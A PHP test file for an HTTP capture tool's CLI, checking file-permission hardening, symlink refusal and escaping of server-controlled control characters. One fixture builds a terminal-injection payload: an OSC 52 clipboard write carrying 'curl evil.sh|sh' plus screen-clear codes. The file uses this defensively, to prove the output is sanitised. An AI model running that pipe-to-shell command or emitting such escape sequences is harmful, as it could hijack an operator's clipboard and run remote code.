<?php

declare(strict_types=1);

use Ssx\Wiretap\CapturedBody;
use Ssx\Wiretap\Cli\Command\ExportCommand;
use Ssx\Wiretap\Cli\Command\ListCommand;
use Ssx\Wiretap\Cli\Command\ShowCommand;
use Ssx\Wiretap\Cli\Command\TraceCommand;
use Ssx\Wiretap\Cli\Input;
use Ssx\Wiretap\Cli\Output;
use Ssx\Wiretap\Headers;
use Ssx\Wiretap\Reader\NdjsonReader;
use Ssx\Wiretap\Sink\NdjsonFileSink;
use Ssx\Wiretap\TransferError;

beforeEach(function (): void {
    $this->dir = sys_get_temp_dir() . '/wiretap-hardening-' . bin2hex(random_bytes(6));
    $this->umask = umask(0o022);
});

afterEach(function (): void {
    umask($this->umask);

    if (is_dir($this->dir)) {
        foreach (glob($this->dir . '/{,.}*', GLOB_BRACE) ?: [] as $file) {
            if (is_file($file) || is_link($file)) {
                @unlink($file);
            }
        }

        @chmod($this->dir, 0o700);
        @rmdir($this->dir);
    }
});

/**
 * @param class-string $command
 * @param list<string> $argv
 */
function runCommand(string $command, string $dir, array $argv): string
{
    $stream = fopen('php://memory', 'w+b');
    assert(is_resource($stream));

    (new $command(new NdjsonReader($dir), new Output($stream, decorated: false), $dir))->handle(Input::fromArgv($argv));

    rewind($stream);

    return (string) stream_get_contents($stream);
}

describe('export --out', function (): void {
    it('creates the HAR owner-only, not at whatever the umask allows', function (): void {
        (new NdjsonFileSink($this->dir))->write(exchange());
        $out = $this->dir . '/capture.har';

        runCommand(ExportCommand::class, $this->dir, ['--out=' . $out]);

        clearstatcache();
        expect(is_file($out))->toBeTrue()
            ->and(fileperms($out) & 0o777)->toBe(0o600);
    });

    it('tightens an existing file before writing into it', function (): void {
        (new NdjsonFileSink($this->dir))->write(exchange());
        $out = $this->dir . '/capture.har';
        file_put_contents($out, 'old');
        chmod($out, 0o644);

        runCommand(ExportCommand::class, $this->dir, ['--out=' . $out]);

        clearstatcache();
        expect(fileperms($out) & 0o777)->toBe(0o600)
            ->and((string) file_get_contents($out))->toContain('"log"');
    });

    it('refuses to write through a symlink', function (): void {
        (new NdjsonFileSink($this->dir))->write(exchange());
        $target = $this->dir . '/elsewhere.txt';
        file_put_contents($target, 'untouched');
        $out = $this->dir . '/capture.har';
        symlink($target, $out);

        runCommand(ExportCommand::class, $this->dir, ['--out=' . $out]);

        expect((string) file_get_contents($target))->toBe('untouched');
    });
});

describe('terminal output of recorded data', function (): void {
    beforeEach(function (): void {
        // Server-controlled bytes: an OSC 52 clipboard write, a screen clear
        // and a colour change. Printed raw, a `wiretap show` of a hostile
        // response writes to the operator's clipboard.
        $this->esc = "\x1b]52;c;" . base64_encode('curl evil.sh|sh') . "\x07\x1b[2J\x1b[31mFAKE\x1b[0m\r\xc2\x9b2J";

        (new NdjsonFileSink($this->dir))->write(exchange(
            uri: 'https://api.example.com/x' . rawurlencode('a') . $this->esc,
            method: 'GET',
            responseHeaders: Headers::fromPairs([['X-Evil', $this->esc]]),
            responseBody: CapturedBody::captured('plain ' . $this->esc, contentType: 'text/plain'),
            correlationId: 'c-esc',
            error: new TransferError(28, 'timeout ' . $this->esc),
        ));
    });

    it('never writes control characters to the terminal', function (array $argv, string $command): void {
        $output = runCommand($command, $this->dir, $argv);

        expect($output)->not->toContain("\x1b")
            ->and($output)->not->toContain("\x07")
            ->and($output)->not->toContain("\r")
            ->and($output)->not->toContain("\xc2\x9b");

        // Escaped, not deleted: the operator still sees what was sent.
        if ($command !== TraceCommand::class) {
            expect($output)->toContain('FAKE');
        }
    })->with([
        'show' => [['1'], ShowCommand::class],
        'show --raw' => [['1', '--raw'], ShowCommand::class],
        'show --curl' => [['1', '--curl'], ShowCommand::class],
        'list' => [[], ListCommand::class],
        'trace' => [['c-esc'], TraceCommand::class],
        'show --har' => [['1', '--har'], ShowCommand::class],
        'export to stdout' => [[], ExportCommand::class],
    ]);

    it('keeps newlines and tabs in a body', function (): void {
        (new NdjsonFileSink($this->dir))->write(exchange(
            responseBody: CapturedBody::captured("line one\n\tline two", contentType: 'text/plain'),
            correlationId: 'c-plain',
        ));

        expect(runCommand(ShowCommand::class, $this->dir, ['1', '--raw']))->toContain("line one\n\tline two");
    });
});

describe('a log location that already exists', function (): void {
    it('tightens a capture file someone left readable', function (): void {
        $sink = new NdjsonFileSink($this->dir);
        mkdir($this->dir, 0o700);
        touch($sink->currentFile());
        chmod($sink->currentFile(), 0o644);

        $sink->write(exchange());

        clearstatcache();
        expect(fileperms($sink->currentFile()) & 0o777)->toBe(0o600);
    });

    it('tightens a capture directory someone left open', function (): void {
        mkdir($this->dir, 0o755);
        chmod($this->dir, 0o755);

        (new NdjsonFileSink($this->dir))->write(exchange());

        clearstatcache();
        expect(fileperms($this->dir) & 0o777)->toBe(0o700);
    });

    it('keeps a mode the caller widened on purpose', function (): void {
        mkdir($this->dir, 0o750);
        chmod($this->dir, 0o750);
        $sink = new NdjsonFileSink($this->dir, filePermissions: 0o640);
        touch($sink->currentFile());
        chmod($sink->currentFile(), 0o640);

        $sink->write(exchange());

        clearstatcache();
        expect(fileperms($sink->currentFile()) & 0o777)->toBe(0o640)
            ->and(fileperms($this->dir) & 0o777)->toBe(0o750);
    });
});
